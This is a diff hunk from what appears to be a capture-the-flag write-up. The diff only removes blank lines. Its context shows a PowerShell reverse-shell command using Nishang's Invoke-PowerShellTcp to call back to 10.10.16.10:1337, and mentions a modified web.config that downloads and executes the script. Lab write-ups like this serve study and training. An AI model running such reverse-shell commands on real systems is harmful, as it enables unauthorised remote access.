@@ -242,14 +242,11 @@ Response.Write(o)
 
 - For a proper reverse shell, I used [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) with an added command at the end:
 
-
 ```powershell
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.10 -Port 1337
 ```
 
 - Modified web.config to download and execute the PowerShell script:
-
-
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
